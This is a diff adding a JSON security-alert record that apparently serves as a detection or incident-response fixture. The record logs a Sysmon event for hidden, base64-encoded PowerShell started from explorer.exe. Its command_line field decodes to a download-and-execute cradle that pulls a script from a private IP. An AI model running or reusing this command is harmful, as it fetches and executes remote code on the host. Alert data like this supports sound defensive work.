@@ -1,0 +1,16 @@
+{
+  "alert_id": "SEC-ALERT-2026-002",
+  "timestamp": "2026-10-10T07:42:01Z",
+  "host": "vm-windows-target",
+  "user": "azureuser",
+  "event_source": "Microsoft-Windows-Sysmon",
+  "event_id": 1,
+  "description": "Suspicious base64 encoded PowerShell execution",
+  "details": {
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA6ADgwADgAMAAvAHMAZQBjAHIAZQB0AC4AcABzADEAJwApAA==",
+    "process_id": 6124,
+    "parent_image": "C:\\Windows\\explorer.exe",
+    "parent_command_line": "C:\\Windows\\explorer.exe"
+  }
+}
